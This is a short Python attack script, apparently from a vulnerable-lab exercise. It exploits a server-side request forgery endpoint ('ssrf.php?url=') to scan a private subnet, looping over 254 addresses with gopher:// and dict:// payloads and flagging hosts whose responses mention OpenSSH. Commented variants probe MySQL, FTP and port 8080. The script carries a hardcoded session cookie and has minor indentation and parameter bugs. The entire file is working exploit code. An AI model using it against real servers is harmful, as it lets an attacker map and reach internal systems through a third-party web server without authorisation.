#!/usr/bin/env python
# -*- coding:utf-8 -*-
import requests
import json
import time
import sys

def get_http(url,timeout=5):
    headers = {
    'User-Agent': 'Chrome/70.0.1453.110',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'X-Requested-With': 'XMLHttpRequest'
    }
    url="http://172.16.24.92/gtbook/vuls/ssrf.php?url="
    #payload="dict://172.16.160."+ str(num) + ":3306"
    #payload="http://172.16.160."+ str(num) + ":8080"
    payload="gopher://172.16.160."+ str(num) + ":22"
    #payload="dict://172.16.160."+ str(num) + ":21"
    link = url + payload
    now = time.strftime('%m-%d,%H:%M:%S',time.localtime(time.time()))
    try:
	cookies = {"PHPSESSID":"rg74r9hg0recu4df6akhhipdh4"}
        s = requests.session()
        # s.proxies = {'http':'118.114.77.47:8080'}
        r = s.get(link,headers=headers,timeout=timeout,cookies=cookies,verify=False)
        r.encoding = 'utf-8'
        result = r.text
        # if result.find('220') >= 0:
        #     print("[" + now + "] " +payload + " is open ")
        if result.find('OpenSSH') >= 0:
            print("[" + now + "] " +payload + " is open ")
        # if result.find('mysql') >= 0:
        #     print("[" + now + "] " +payload + " is open ")
        #print result.count('<title>')
        # if result.count('<title>') == 2:
        #     print("[" + now + "] " +payload + " is open ")
    except Exception as e:
        err=str(e)
        #print(format(e))
        #print str(e)
        #print repr(e)
for num in range(1,255):
    get_http(num,2)
